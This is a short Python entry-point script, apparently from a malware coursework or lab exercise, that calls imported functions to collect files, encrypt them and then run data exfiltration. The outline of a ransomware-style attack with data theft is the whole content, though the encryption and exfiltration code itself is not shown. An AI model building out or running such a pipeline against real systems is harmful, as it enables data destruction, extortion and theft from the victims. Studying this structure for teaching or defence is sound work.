from file_collecter import collect_files
from Task_2 import run_encryption
from Task_3 import run_exfiltration

def main():
    files = collect_files()
    run_encryption(files)
    run_exfiltration()

if __name__ == "__main__":
    main()

